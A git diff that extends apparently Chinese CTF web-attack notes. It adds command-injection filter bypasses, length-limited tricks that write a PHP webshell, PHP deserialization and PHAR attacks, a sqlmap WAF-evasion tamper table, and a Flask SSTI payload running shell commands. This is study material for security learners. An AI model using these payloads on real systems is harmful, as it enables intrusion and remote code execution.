@@ -2,6 +2,17 @@
 
 ## 命令执行
 
+```
+command1 & command2 ：先执行command2后执行command1
+command1 && command2 ：先执行command1后执行command2
+command1 | command2 ：只执行command2
+command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)
+```
+
+
+### 空格绕过
+
+```
 > < <> 重定向符
 %09(需要php环境)
 ${IFS}
@@ -9,6 +20,202 @@ $IFS$9
 {cat,flag.php} //用逗号实现了空格功能
 %20
 %09
+```
+
+### 黑名单绕过
+
+** 拼接 **
+
+```
+a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e;
+```
+
+** base64 **
+
+使用反引号包含base64解码后的命令
+```
+echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d`
+```
+
+将base64解码后的命令通过管道符传递给bash
+```
+echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d | bash
+```
+
+** 单引号，双引号 **
+
+```
+c""at fl''ag.tx""t
+```
+
+** 反斜杠 **
+
+```
+c\at fl\a\g.tx\t
+```
+
+** $1 **
+
+```
+ca$1t fl$1ag.t$1xt
+```
+
+** 读文件绕过 **
+
+```
+(1)more:一页一页的显示档案内容
+(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
+(3)head:查看头几行
+(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+(5)tail:查看尾几行
+(6)nl：显示的时候，顺便输出行号
+(7)od:以二进制的方式读取档案内容
+(8)vi:一种编辑器，这个也可以查看
+(9)vim:一种编辑器，这个也可以查看
+(10)sort:可以查看
+(11)uniq:可以查看
+(12)file -f:报错出具体内容
+```
+
+** 通配符绕过 **
+
+/???会去寻找 / 目录下的三个字符长度的文件，正常情况下会寻找到/bin，然后/?[a][t]会优先匹配到/bin/cat,就成功调用了cat命令，然后后面可以使用正常的通配符匹配所需读的文件，如flag.txt文件名长度为8，使用8个?，此命令就会读取所有长度为8的文件。
+
+```
+/???/?[a][t] ????????
+```
+
+** 命令嵌套 **
+
+```
+echo "result:`whoami`"
+echo "result:$(uname -a)"
+```
+
+** 长度绕过 **
+
+1. 使用>>绕过长度限制
+使用>>每次添加一部分命令到文件中
+
+```
+echo -n "cmd1" > r;echo -n "cmd2" >> r;echo -n "cmd3" >> r;echo "cmd4" >> r;
+```
+
+然后使用cat r | bash执行命令
+
+使用换行执行和ls -t绕过长度限制
+linux中，文件中的命令如果需要换行书写，需要在前一行末尾增加\，如文件a中有
+
+```
+ca\t flag.t\xt
+```
+
+使用sh a即可执行命令cat flag.txt
+
+2. 15位可控字符下的任意命令执行
+
+如需执行 echo \<?php eval($_GET[1]);?\>>1
+
+```
+echo \<?php >1
+echo eval\(>>1
+echo \$_GET>>1
+echo \[1\]>>1
+echo \)\;?>>1
+```
+
+3. 7位可控字符下的任意命令执行
+
+1>a或者w>b分别可以创建a和b两个空文件夹。
+
+ls>c会将目录下面的文件名写入到c文件中；ls -t>0会将文件名按照创建的时间倒叙写入0文件中。并且自动换行。
+
+\作为转义符，转义之后的'\'是用来换行分隔，也就是换行也是连接的。
+
+```
+ca\
+t
+这就代表cat
+```
+
+例如这样的代码：
+
+```
+<?php
+if(strlen($_GET[1])<8){
+     echo shell_exec($_GET[1]);
+}
+?>
+```
+
+假设我产要写入<?php echo phpinfo();
+
+echo PD9waHAgcGhwaW5mbygpOw== | base64 -d >1.php
+
+```
+w>hp
+w>1.p\\
+w>d\>\\
+w>\-\\
+w>e64\\
+w>bas\\
+w>=\|\\
+w>w=\\
+w>gpO\\
+w>mby\\
+w>aW5\\
+w>Ghw\\
+w>Agc\\
+w>waH\\
+w>PD9\\
+w>o\ \\
+w>ech\\
+
+ls -t>0
+
+sh 0
+```
+
+倒叙新建文件名，然后通过ls -t>0，将刚才的顺序再倒序然后写入到0文件中，然后用sh将0当作脚本执行。
+
+4. 5位可控字符下的任意命令执行
+
+ls -t>0 超过了5位
+
+```
+>ls\\
+ls>a
+>\ \\
+>-t\\
+>\>0
+ls>>a
+```
+
+这就将ls -t>0写在了a脚本中，如果要用的话直接sh a，之后写入自己的命令按照7位的逻辑写就行了。
+
+
+5. 4位可控字符下的任意命令执行 参考 https://www.sohu.com/a/208155480_354899
+
+ls -th>f 超过了4位
+
+```
+>f\>
+>ht-
+>sl
+>dir
+*>v
+>rev
+*v>0
+cat 0
+```
+
+这就将ls -th>f写入到了脚本0当中，后面就可以直接按照7位的那样写入我们要执行的命令，最后使用sh 0执行ls -th>f，然后将命令写入了f脚本中，执行sh f即可。
+
+注意：
+
+> py\\这里看着是5个字符，超过了4个的限制，实际上是因为 shell环境需要输入\\产生\，但是php 代码exec时，只需要输入\即可产生\，比如 exec(“>py\”)即可。
+
+> 这上面的所以payload均在linux终端shell里面进行操作，因此需要'\'的地方都进行了再加'\'转义，也就变成了'\\'，如果在命令注入函数里面输入时，'\'不需要用'\'转义。
 
 ## SQL注入
 
@@ -1494,6 +1701,375 @@ https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2018-12613
 `/var/log/mail.log`
 
 或者可以参考安恒杯6月赛web2 easypentest https://blog.szfszf.top/tech/%E5%AE%89%E6%81%92%E6%9D%AF6%E6%9C%88%E8%B5%9B-easypentest/
+
+## php反序列化
+
+PHP通过`string serialize(mixed $value)`和`mixed unserialize(string $str)`两个函数实现序列化和反序列化。
+
+### 魔数方法
+
+下面是比较典型的PHP反序列化漏洞中可能会用到的魔术方法：
+
+**void __wakeup ( void )**
+
+unserialize( )会检查是否存在一个_wakeup( ) 方法。如果存在，则会先调用_wakeup 方法，预先准备对象需要的资源。
+
+**void __construct ([ mixed $args [, $... ]])**
+
+具有构造函数的类会在每次创建新对象时先调用此方法。
+
+**void __destruct ( void )**
+
+析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。
+
+**public string __toString ( void )**
+
+__toString( ) 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj;应该显示些什么。
+
+此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。
+
+```
+ 1 __construct   当一个对象创建时被调用，
+ 2 __destruct   当一个对象销毁时被调用，
+ 3 __toString   当一个对象被当作一个字符串被调用。
+ 4 __wakeup()   使用unserialize时触发
+ 5 __sleep()    使用serialize时触发
+ 6 __destruct()    对象被销毁时触发
+ 7 __call()    在对象上下文中调用不可访问的方法时触发
+ 8 __callStatic()    在静态上下文中调用不可访问的方法时触发
+ 9 __get()    用于从不可访问的属性读取数据
+10 __set()    用于将数据写入不可访问的属性
+11 __isset()    在不可访问的属性上调用isset()或empty()触发
+12 __unset()     在不可访问的属性上使用unset()时触发
+13 __toString()    把类当作字符串使用时触发,返回值需要为字符串
+14 __invoke()   当脚本尝试将对象调用为函数时触发
+```
+
+### 利用方式
+
+1. **__wakeup( )绕过**
+
+(CVE-2016-7124)
+
+反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。
+
+影响版本：
+
+PHP before 5.6.25
+7.x before 7.0.10
+
+DEMO如下：
+
+![](images/ctf-2021-09-26-09-30-09.png)
+
+![](images/ctf-2021-09-26-09-30-17.png)
+
+2. **注入对象构造方法**
+
+当目标对象被private、protected修饰时的构造方法。
+
+示例代码：
+
+![](images/ctf-2021-09-26-09-31-37.png)
+
+![](images/ctf-2021-09-26-09-31-42.png)
+
+3. **同名方法利用**
+
+![](images/ctf-2021-09-26-09-32-41.png)
+
+这个例子中，class B和class C有一个同名方法action，我们可以构造目标对象，使得析构函数调用class C的action方法，实现任意代码执行。
+
+构造代码：
+
+![](images/ctf-2021-09-26-09-32-51.png)
+
+![](images/ctf-2021-09-26-09-32-58.png)
+
+4. **Session反序列化漏洞**
+
+PHP中的Session经序列化后存储，读取时再进行反序列化。
+
+相关配置：
+
+```
+session.save_path="" //设置session的存储路径
+session.save_handler="" //设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
+session.auto_start boolen //指定会话模块是否在请求开始时启动一个会话默认为0不启动
+session.serialize_handler string//定义用来序列化/反序列化的处理器名字。默认使用php
+```
+
+PHP中有三种序列化处理器，如下表所示：
+
+![](images/ctf-2021-09-26-09-34-41.png)
+
+示例代码：
+
+![](images/ctf-2021-09-26-09-34-54.png)
+
+命名为sess_Session_id。
+
+存储内容为序列化后的session：test|s:4:"test";
+
+不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的Session序列化格式不同，就可能产生反序列化漏洞。
+
+下面演示漏洞利用：
+
+![](images/ctf-2021-09-26-09-35-08.png)
+
+该页面中有类demo3，开启session，并用php处理器处理session。
+
+![](images/ctf-2021-09-26-09-35-18.png)
+
+通过session.php设置session，通过generate.php构造实例。
+
+由于session.php与demo3.php采用的序列化处理器不同，我们可以构造“误导”处理器，达到漏洞利用的目的。
+
+实例构造：
+
+![](images/ctf-2021-09-26-09-35-27.png)
+
+访问demo3.php成功创建了一个类demo3的实例。
+
+5. **PHAR利用**
+
+1) PHAR简介
+
+PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。
+
+2) PHAR文件结构
+
+PHAR文件由3或4个部分组成：
+
+（1）stub //PHAR文件头
+
+stub就是一个简单的php文件，最简文件头为：
+
+<?php __HALT_COMPILER( )；?>是可有可无的，若使用?>，则;与?>间至多一个空格。
+
+文件头中必须包含__HALT_COMPILER();除此之外没有限制。（PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测）
+
+（2）manifest describing the contents //PHAR文件描述该部分存储文件名、文件大小等信息，如下图所示。
+
+![](images/ctf-2021-09-26-09-39-43.png)
+
+图中标出的地方，存储了经serialize( )的Meta-data，有序列化过程必有反序列化过程，这就是我们的注入点。
+
+（3）the file contents
+
+PHAR文件内容
+
+（4）[optional] a signature for verifying Phar integrity (phar file format only) //可选的签名部分，支持MD5和SHA1
+
+![](images/ctf-2021-09-26-09-39-55.png)
+
+3) 攻击方法
+
+2018年Black Hat研究院Sam Thomas的议题：
+
+It’s a PHP unserialization vulnerability Jim, but not as we know it提供了一种新的php反序列化攻击姿势。PHAR文件的Meta-data可以是任何能够序列化的PHP对象，当PHAR文件被任何文件系统函数首次通过phar://协议解析时Meta-data部分会被反序列化，这个反序列化过程就是我们的攻击点，Meta-data部分填充payload。
+
+漏洞利用条件：
+
+在目标系统上投放一个装在payload的可访问的PHAR文件，通过文件系统函数利用phar://伪协议解析目标PHAR文件。
+
+下面演示利用过程：
+
+先创建一个PHAR文件。
+
+注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。
+
+![](images/ctf-2021-09-26-09-40-52.png)
+
+访问phar.php，在同目录下生成phar.phar文件。
+
+![](images/ctf-2021-09-26-09-41-01.png)
+
+箭头标出Meta-data部分，可以看到为序列化后结果。
+
+![](images/ctf-2021-09-26-09-41-10.png)
+
+输出了之前打包的phar文件中，test.txt文件内容，并成功实例化TestObject对象，调用了析构函数。
+
+由于PHP仅通过stub部分判断文件是否为PHAR文件，我们可以通过添加文件头、修改后缀的方式绕过上传检测。
+
+示例代码：
+
+![](images/ctf-2021-09-26-09-41-18.png)
+
+## 常用工具
+
+
+
+### sqlmap
+
+```
+sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --file-write=本地文件路径 --file-dest 网站路径(写入路径)+"/写入的文件名"
+sqlmap.py --list-tamper
+
+```
+
+**基础使用**
+
+参考help文档
+
+**tamper**
+
+列表
+
+>   参考 https://blog.csdn.net/Captain_RB/article/details/112965164
+https://www.cnblogs.com/sdgfsdgfsd/p/14409049.html
+
+模块|功能|实例
+ --------   | -----   | ---- |
+apostrophemask.py | 对单引号'用URL-UTF8编码 | '==>%EF%BC%87
+apostrophenullencode.py | 对单引号'用非法的双UNICODE编码 | '==>%00%27
+unmagicquotes.py | 将单引号'替换成多个字节
+并在结尾处添加注释符 | ' UNION SELECT==>%BF%27 UNION SELECT&#35;
+escapequotes.py | 斜杠转义单引号'和双引号" | AND id='1' ==> AND id=\'1\'
+base64encode.py | 对payload进行一次BASE64编码 | 1 AND 1=1 ==> MSBBTkQgMT0x
+charunicodeencode.py | 对payload进行一次URL-UNICODE编码 | SELECT ==>%u0053%u0045%u004C%u0045%u0043%u0054
+charunicodeescape.py | 对payload进行UNICODE格式转义编码 | SELECT ==>\u0053\u0045\u004C\u0045\u0043\u0054
+htmlencode.py | 对payload中非字母非数字字符进行HTML编码 | AND id='1' ==> AND id=&&#35;39;1&&#35;39;
+charencode.py | 对payload进行一次URL编码 | SELECT ==> %53%45%4C%45%43%54
+chardoubleencode.py | 对payload进行两次URL编码 | SELECT ==>%2553%2545%254C%2545%2543%2554
+overlongutf8.py | 将payload中非字母非数字字符用超长UTF8编码 | ' UNION SELECT==>%C0%A7UNION%C0%AASELECT
+overlongutf8more.py | 将payload中所有字符用超长UTF8编码 | SELECT==>%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94
+equaltolike.py | 将payload中所有=替换成LIKE | 1 AND id=1 ==> 1 AND id LIKE 1
+equaltorlike.py | 将payload中所有=替换成RLIKE | 1 AND id=1 ==> 1 AND id RLIKE 1
+bluecoat.py | 将SQL语句中空格字符' '替换为%09
+并替换=为LIKE | 1 AND id=1 ==> 1%09AND%09id LIKE 1
+space2dash.py | 将空格字符' '替换成：--+随机字符串+\n | UNION SELECT==>UNION--gFdjw%0ASELECT
+space2hash.py | 将MySQL payload中空格字符' '替换成：
+&#35;+随机字符串+\n | UNION SELECT==>UNION&#35;gFdjw%0ASELECT
+space2morehash.py | 将MySQL payload中空格字符' '替换成：
+&#35;+随机字符串+\n | UNION SELECT==>UNION&#35;kHeeR%0ASELECT
+space2mssqlblank.py | 将MsSQL payload中空格字符' '替换成
+随机的空字符：(%01, %02, %03, %04···%0F) | UNION SELECT * FROM user==>UNION%03SELECT%0A*%01FROM%05user
+space2mssqlhash.py | 将MySQL payload中空格字符' '替换成：&#35;+\n | UNION SELECT==>UNION&#35;%0ASELECT
+space2mysqlblank.py | 将MySQL payload中空格字符' '替换成
+随机的空字符：(%09, %0A, %0B, %0C, %0D) | UNION SELECT * FROM user==>UNION%0ASELECT%0C*%0DFROM%09user
+space2mysqldash.py | 将MySQL payload中空格字符' '替换成：--+\n | UNION SELECT==>UNION--%0ASELECT
+space2plus.py | 将空格字符' '替换成+ | UNION SELECT==>UNION+SELECT
+space2randomblank.py | 将空格字符' '替换成随机的空字符：(%09, %0A, %0C, %0D) | UNION SELECT * FROM user==>UNION%0ASELECT%0C*%0AFROM%09user
+0eunion.py | UNION语句替换 | <int> UNION==><int>e0UNION
+unionalltounion.py | UNION语句替换 | UNION ALL SELECT==>UNION SELECT
+misunion.py | UNION语句替换 | UNION==>-.1UNION
+dunion.py | UNION语句替换 | <int> UNION ==> <int>DUNION
+sleep2getlock.py | SLEEP语句替换 | SLEEP(5)==>GET_LOCK('ETgP',5)
+ifnull2casewhenisnull.py | IFNULL语句替换 | IFNULL(A, B)==>CASE WHEN ISNULL(A) THEN (B) ELSE (A) END
+ifnull2ifisnull.py | IFNULL语句替换 | IFNULL(A, B)==>IF(ISNULL(A), B, A)
+commalesslimit.py | MySQL payload中LIMIT语句替换 | LIMIT M, N==>LIMIT N OFFSET M
+commalessmid.py | MySQL payload中MID语句替换 | MID(A, B, C)==>MID(A FROM B FOR C)
+hex2char.py | MySQL payload中CONCAT(CHAR(),…)语句替换 | 0x<hex>==>CONCAT(CHAR(),…)
+between.py | 用BETWEEN语句替换=<>号 | AND A=B ==> AND A BETWEEN B AND B AND A>B ==>AND A NOT BETWEEN 0 AND B
+concat2concatws.py | MySQL payload中CONCAT语句替换 | CONCAT(A, B)==> CONCAT_WS(MID(CHAR(0), 0, 0), A, B)
+space2comment.py | 将空格字符' '替换成注释符/**/ | UNION SELECT==>UNION/**/SELECT
+space2morecomment.py | 将MySQL payload中空格字符' '替换成注释符/**_**/ | UNION SELECT==>UNION/**_**/SELECT
+commentbeforeparentheses.py | 在括号前加上/**/注释 | ()==>/**/()
+halfversionedmorekeywords.py | 在关键字前添加MySQL版本注释信息 | SELECT A AND B ==> /*!0SELECT A /*!0AND B
+modsecurityversioned.py | 用注释来包围完整的MySQL查询语句 | ' UNION SELECT * FROM user&#35;==>' /*!UNION SELECT * FROM user*/&#35;
+modsecurityzeroversioned.py | 用注释来包围完整的MySQL查询语句 | ' UNION SELECT * FROM user&#35;==>' /*!000UNION SELECT * FROM user*/&#35;
+randomcomments.py | 在SQL关键字的字符之间随机添加注释符 | SELECT==>S/**/E/**/LECT
+versionedkeywords.py | 对MySQL payload中非函数的关键字进行注释 | UNION SELECT user()==>/*!UNION*/ /*!SELECT*/ user()
+versionedmorekeywords.py | 对MySQL payload中所有关键字进行注释 | UNION SELECT user()==>/*!UNION*/ /*!SELECT*/ /*!user*/()
+appendnullbyte.py | 在payload结束位置加零字节字符%00 | 1 AND 1=1 ==> 1 AND 1=1%00
+binary.py | 在payload可能位置插入关键字binary | 1 UNION SELECT NULL==> 1 UNION SELECT binary NULL
+greatest.py | >替换成GREATEST语句 | 1 AND A > B ==> 1 AND GREATEST(A, B+1)=A
+least.py | >替换成LEAST语句 | 1 AND A > B ==> 1 AND LEAST(A-1, B)=B informationschemacomment.py | 在"information_schema"后面加上/**/ | select * from information_schema.tables==> select * from information_schema/**/.tables
+lowercase.py | 将所有大写字符替换成小写字符 | SELECT==>select
+uppercase.py | 将所有小写字符替换成大写字符 | select==>SELECT
+multiplespaces.py | 在SQL关键字旁添加多个空格符' ' | UNION%20SELECT==>%20UNION%20%20SELECT%20
+percentage.py | payload中每个字符前加% | SELECT==>%S%E%L%E%C%T
+plus2concat.py | 将+替换成MsSQL的CONCAT()语句 | select char(102)+char(107)==> select concat(char(102),char(107))
+plus2fnconcat.py | 将+替换成MsSQL的{fn CONCAT()}语句 | select char(102)+char(107)==> select {fn concat(char(102),char(107))}
+randomcase.py | 对每个SQL关键字的字符替换成随机大小写 | SELECT==>SEleCt
+schemasplit.py | 拆分数据库标识符 | testdb.users==>testdb 9.e.users
+sp_password.py | 在MsSQL payload后添加ssp_password 用于混淆数据库日志 | UNION SELECT * FROM user&#35;==> UNION SELECT * FROM user&#35;ssp_password
+substring2leftright.py | 将PostgreSQL中SUBSTRING语句 用LEFT和RIGHT代替 | SUBSTRING((SELECT *)::text FROM 1 FOR 1) ==>LEFT((SELECT *)::text,1)
+symboliclogical.py | 将AND和OR替换成&&和|| | SELECT 1 or 1=1==>SELECT 1 %26%26 1=1
+luanginx.py | 针对LUA-Nginx WAF进行绕过 | 
+varnish.py | 添加一个HTTP头X-originating-IP 用来绕过Varnish防火墙 | 
+xforwardedfor.py | 添加伪造的HTTP头X-Forwarded-For | 
+
+Mysql匹配版本
+
+MySQL 版本 | 测试模块
+---   | --- 
+4.0/5.0 | space2hash
+4.0/5.0/5.5 | between, charencode, equaltolike, equaltorlike, greatest, hex2char, least, lowercase, randomcase, space2comment, space2randomblank, uppercase
+5.1 | bluecoat, space2mysqlblank
+5.0/5.5 | commalesslimit, commalessmid, ifnull2casewhenisnull, ifnull2ifisnull, sleep2getlock, space2morecomment
+5.0 | concat2concatws, modsecurityversioned, modsecurityzeroversioned
+5.1.56 | charunicodeencode
+5.1.56/5.5.11 | percentage, versionedmorekeywords
+4.0.18/5.0.22 | halfversionedmorekeywords
+4.0.18/5.1.56/5.5.11 | versionedkeywords
+5.1.41 | space2morehash
+未明确 | 0eunion, binary, commentbeforeparentheses, misunion, space2mssqlhash, space2mysqldash
+
+MsSQL
+
+MsSQL 版本 | 测试模块
+---   | --- 
+2005/2000 | charunicodeencode, percentage, space2mssqlblank
+2005 | between, charencode, equaltolike, lowercase, randomcase, space2comment, space2randomblank, uppercase
+2008 | plus2fnconcat
+2012 | plus2concat
+未明确 | 0eunion, commentbeforeparentheses, sp_password, space2dash, space2mssqlhash, space2mysqldash
+
+PostgreSQL
+
+PostgreSQL 版本 | 测试模块
+---   | --- 
+8.3/8.4/9.0 | between, charencode, greatest, least, lowercase, randomcase, space2comment, space2randomblank, uppercase
+9.0 | percentage
+9.0.3 | charunicodeencode
+9.6.12 | substring2leftright
+未明确 | commentbeforeparentheses
+
+Oracle
+
+Oracle 版本 | 测试模块
+---   | --- 
+10g | between, charencode, greatest, least, lowercase, randomcase, space2comment, space2randomblank, uppercase
+未明确 | dunion, commentbeforeparentheses
+
+Access
+
+Access 版本 | 测试模块
+---   | --- 
+未明确 | appendnullbyte
+
+SQLite
+
+SQLite 版本 | 测试模块
+---   | --- 
+3 | randomcase
+未明确 | space2dash
+
+## SSTI
+
+### python flask模版注入
+
+
+```
+//调用os模块的popen执行ls打印所有文件
+{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen("命令").read()}}
+{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen("ls").read()}}
+
+//或者
+
+//调用os模块的listdir打印文件
+{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir("./")}}
+
+e.g.：
+Payload：
+http://220.249.52.133:39570/%7B%7B[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen(%22ls%22).read()%7D%7D
+
+返回内容为：
+URL http://220.249.52.133:39570/fl4g index.py not found
+```
 
 ## 参考
 
